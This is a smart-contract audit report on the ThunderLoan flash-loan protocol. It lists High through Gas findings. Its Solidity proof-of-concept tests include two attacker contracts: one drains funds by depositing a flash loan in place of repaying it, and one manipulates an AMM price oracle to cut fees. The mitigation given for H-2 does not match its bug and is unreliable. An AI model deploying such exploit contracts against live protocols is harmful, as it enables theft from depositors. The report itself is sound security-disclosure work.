## High

### [H-1] `ThunderLoan::deposit` erroneously updates the exchange rate, resulting in incorrect fee calculation and inability to redeem funds.

**Description:** `ThunderLoan::deposit` unnecessarily calls `ThunderLoan::updateExchangeRate`, as if the fees are collected. 

```solidity
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

    @>    uint256 calculatedFee = getCalculatedFee(token, amount);
    @>    assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```
This results in improper fee calculation and blocks the redeem functionality. 

**Impact:** Unable to redeem funds due to erroneous fee calculations.

**Proof of Concept:** 
<details>
<summary>Proof of Code</summary>
Add the following test to the test suite:

```solidity
    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```
</details>

**Recommended Mitigation:** Remove the following lines in `ThunderLoan::deposit`:
```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```
### [H-2] Repay check in `ThunderLoan::flashloan` allows attacker to steal funds from the protocol with a low starting balance

**Description:** It is intended, that `flashloan` function reverts if the loan is not repaid. Unfortunately, this check is implemented by checking the `token` balance of the `assetToken` contract: 

```solidity
    uint256 endingBalance = token.balanceOf(address(assetToken));
    if (endingBalance < startingBalance + fee) {
        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
    }
```

This means, that a user can just deposit the loan + fee back in the protocol instead of repaying. 

**Impact:** Protocol funds can be drained with a low starting balance.

**Proof of Concept:** 
1. User gets a flash loan, for that he can cover the fee.
2. User deposits the money into the protocol with `deposit` function, bypassing the check in `flashloan`
3. User withdraws the money with `redeem` function.
4. Repeat until all the money is drained from the protocol

<details>
<summary>Proof of Code</summary>
Add following test and attacker contract to the test suite:

```solidity
    // Add this function to the ThunderLoanTest contract
    function testUseDepositInsteadOfRepay() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
```
</details>

**Recommended Mitigation:** Consider using Chainlink Price Feed to get the current exchange rate and Uniswap TWAP as a fallback oracle.

## Medium

### [M-1] Oracle Manipulation attack opportunity due to usage of AMM protocol as a price oracle

**Description:** `OracleUpgradeable` uses `TSwap` (an AMM protocol) to get the asset price in WETH. The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Attacker gets to pay less fees, liquidity providers receive fewer fees.

**Proof of Concept:** 
1. User borrows 50 `tokenA` and sells them for WETH, nuking the exchange rate.
2. User reenters the `flashloan` function to take a second flash loan while the exchange rate is compromised
   before repaying the first loan.
3. Due to the fact that the way ThunderLoan calculates price based on the TSwapPool this second flash loan is substantially cheaper.

<details>
<summary>Proof of Code</summary>
Add following test and attacker contract to the test suite:

```solidity
    // This function goes to ThunderLoanTest
    function testOracleManipulation() public {
        // Set up
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));

        // 1. Create a TSwap DEX between WETH and TokenA
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp); // Ratio 1:1
        vm.stopPrank();

        // 3. Fund ThunderLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18); // 1000 tokenA in ThunderLoan
        vm.stopPrank();

        // 4. Nuke the price
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("Normal fee: ", normalFeeCost);
        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console2.log("Attack Fee is: ", attackFee);
        assert(attackFee < normalFeeCost);
    }
    

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        if (!attacked) {
            // 1. Swap tokenA borrowed for WETH
            // 2. Take out another flash loan to show the fee difference
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // repay
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // Calculate the fee and repay
            feeTwo = fee;
            // repay
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}
```
</details>

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.

### [M-2] Storage collision after deploying `ThunderLoanUpgraded.sol` results in breaking the fees

**Description:** `ThunderLoan.sol` has two variables in the following order:
```solidity
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```
However, the expected upgraded contract ThunderLoanUpgraded.sol has them in a different order.
```solidity
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```
Variables in the upgraded contract must maintain declaration order as it was stated in original one in order to occupy same [storage slots](https://eips.ethereum.org/EIPS/eip-1967). Otherwise, variable values may be messed up.

**Impact:** After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts.

**Proof of Concept:** 
<details>
<summary>Proof of Code</summary>
Add following test to the test suite:

```solidity
    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console2.log("Fee before: ", feeBeforeUpgrade);
        console2.log("Fee after upgrade: ", feeAfterUpgrade);
        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```

**Recommended Mitigation:** Even swapping `s_flashLoanFee` and `FEE_PRECISION` back in place in `ThunderLoanUpgraded` will not fix the issue, because `FEE_PRECISION` is declared as constant, thus not been written to memory. To keep `s_flashLoanFee` in place, the storage slot of `s_feePrecision` from the first contract must be occupied with a blank variable. 

```diff
-    uint256 private s_flashLoanFee; // 0.3% ETH fee
-    uint256 public constant FEE_PRECISION = 1e18;
+    uint256 private s_blank;
+    uint256 private s_flashLoanFee; 
+    uint256 public constant FEE_PRECISION = 1e18;
```

# Low Issues

## L-1: Centralization Risk for trusted owners

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

<details><summary>6 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 239](src/protocol/ThunderLoan.sol#L239)

	```solidity
	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 265](src/protocol/ThunderLoan.sol#L265)

	```solidity
	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 292](src/protocol/ThunderLoan.sol#L292)

	```solidity
	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 238](src/upgradedProtocol/ThunderLoanUpgraded.sol#L238)

	```solidity
	    function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 264](src/upgradedProtocol/ThunderLoanUpgraded.sol#L264)

	```solidity
	    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 287](src/upgradedProtocol/ThunderLoanUpgraded.sol#L287)

	```solidity
	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
	```

</details>


### L-2: Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>1 Found Instances</summary>


- Found in src/protocol/OracleUpgradeable.sol [Line: 16](src/protocol/OracleUpgradeable.sol#L16)

	```solidity
	        s_poolFactory = poolFactoryAddress;
	```

</details>

## Informational

### I-1: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>8 Found Instances</summary>


- Found in src/interfaces/IFlashLoanReceiver.sol [Line: 2](src/interfaces/IFlashLoanReceiver.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/interfaces/IPoolFactory.sol [Line: 2](src/interfaces/IPoolFactory.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/interfaces/ITSwapPool.sol [Line: 2](src/interfaces/ITSwapPool.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/interfaces/IThunderLoan.sol [Line: 2](src/interfaces/IThunderLoan.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/protocol/AssetToken.sol [Line: 2](src/protocol/AssetToken.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/protocol/OracleUpgradeable.sol [Line: 2](src/protocol/OracleUpgradeable.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/protocol/ThunderLoan.sol [Line: 64](src/protocol/ThunderLoan.sol#L64)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 64](src/upgradedProtocol/ThunderLoanUpgraded.sol#L64)

	```solidity
	pragma solidity ^0.8.22;
	```

</details>



### I-2: `public` functions not used internally could be marked `external`

Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

<details><summary>6 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 231](src/protocol/ThunderLoan.sol#L231)

	```solidity
	    function repay(IERC20 token, uint256 amount) public {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 276](src/protocol/ThunderLoan.sol#L276)

	```solidity
	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
	```

- Found in src/protocol/ThunderLoan.sol [Line: 280](src/protocol/ThunderLoan.sol#L280)

	```solidity
	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 230](src/upgradedProtocol/ThunderLoanUpgraded.sol#L230)

	```solidity
	    function repay(IERC20 token, uint256 amount) public {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 275](src/upgradedProtocol/ThunderLoanUpgraded.sol#L275)

	```solidity
	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 279](src/upgradedProtocol/ThunderLoanUpgraded.sol#L279)

	```solidity
	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
	```

</details>



### I-3: Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

<details><summary>9 Found Instances</summary>


- Found in src/protocol/AssetToken.sol [Line: 31](src/protocol/AssetToken.sol#L31)

	```solidity
	    event ExchangeRateUpdated(uint256 newExchangeRate);
	```

- Found in src/protocol/ThunderLoan.sol [Line: 105](src/protocol/ThunderLoan.sol#L105)

	```solidity
	    event Deposit(address indexed account, IERC20 indexed token, uint256 amount);
	```

- Found in src/protocol/ThunderLoan.sol [Line: 106](src/protocol/ThunderLoan.sol#L106)

	```solidity
	    event AllowedTokenSet(IERC20 indexed token, AssetToken indexed asset, bool allowed);
	```

- Found in src/protocol/ThunderLoan.sol [Line: 107](src/protocol/ThunderLoan.sol#L107)

	```solidity
	    event Redeemed(
	```

- Found in src/protocol/ThunderLoan.sol [Line: 110](src/protocol/ThunderLoan.sol#L110)

	```solidity
	    event FlashLoan(address indexed receiverAddress, IERC20 indexed token, uint256 amount, uint256 fee, bytes params);
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 105](src/upgradedProtocol/ThunderLoanUpgraded.sol#L105)

	```solidity
	    event Deposit(address indexed account, IERC20 indexed token, uint256 amount);
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 106](src/upgradedProtocol/ThunderLoanUpgraded.sol#L106)

	```solidity
	    event AllowedTokenSet(IERC20 indexed token, AssetToken indexed asset, bool allowed);
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 107](src/upgradedProtocol/ThunderLoanUpgraded.sol#L107)

	```solidity
	    event Redeemed(
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 110](src/upgradedProtocol/ThunderLoanUpgraded.sol#L110)

	```solidity
	    event FlashLoan(address indexed receiverAddress, IERC20 indexed token, uint256 amount, uint256 fee, bytes params);
	```

</details>



### I-4: PUSH0 is not supported by all chains

Solc compiler version 0.8.20 switches the default target EVM version to Shanghai, which means that the generated bytecode will include PUSH0 opcodes. Be sure to select the appropriate EVM version in case you intend to deploy on a chain other than mainnet like L2 chains that may not support PUSH0, otherwise deployment of your contracts will fail.

<details><summary>8 Found Instances</summary>


- Found in src/interfaces/IFlashLoanReceiver.sol [Line: 2](src/interfaces/IFlashLoanReceiver.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/interfaces/IPoolFactory.sol [Line: 2](src/interfaces/IPoolFactory.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/interfaces/ITSwapPool.sol [Line: 2](src/interfaces/ITSwapPool.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/interfaces/IThunderLoan.sol [Line: 2](src/interfaces/IThunderLoan.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/protocol/AssetToken.sol [Line: 2](src/protocol/AssetToken.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/protocol/OracleUpgradeable.sol [Line: 2](src/protocol/OracleUpgradeable.sol#L2)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/protocol/ThunderLoan.sol [Line: 64](src/protocol/ThunderLoan.sol#L64)

	```solidity
	pragma solidity ^0.8.22;
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 64](src/upgradedProtocol/ThunderLoanUpgraded.sol#L64)

	```solidity
	pragma solidity ^0.8.22;
	```

</details>

## Gas

### G-1: Empty Block

Consider removing empty blocks.

<details><summary>2 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 292](src/protocol/ThunderLoan.sol#L292)

	```solidity
	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 287](src/upgradedProtocol/ThunderLoanUpgraded.sol#L287)

	```solidity
	    function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
	```

</details>



### G-2: Unused Custom Error

it is recommended that the definition be removed when custom error is unused

<details><summary>2 Found Instances</summary>


- Found in src/protocol/ThunderLoan.sol [Line: 84](src/protocol/ThunderLoan.sol#L84)

	```solidity
	    error ThunderLoan__ExhangeRateCanOnlyIncrease();
	```

- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 84](src/upgradedProtocol/ThunderLoanUpgraded.sol#L84)

	```solidity
	    error ThunderLoan__ExhangeRateCanOnlyIncrease();
	```

</details>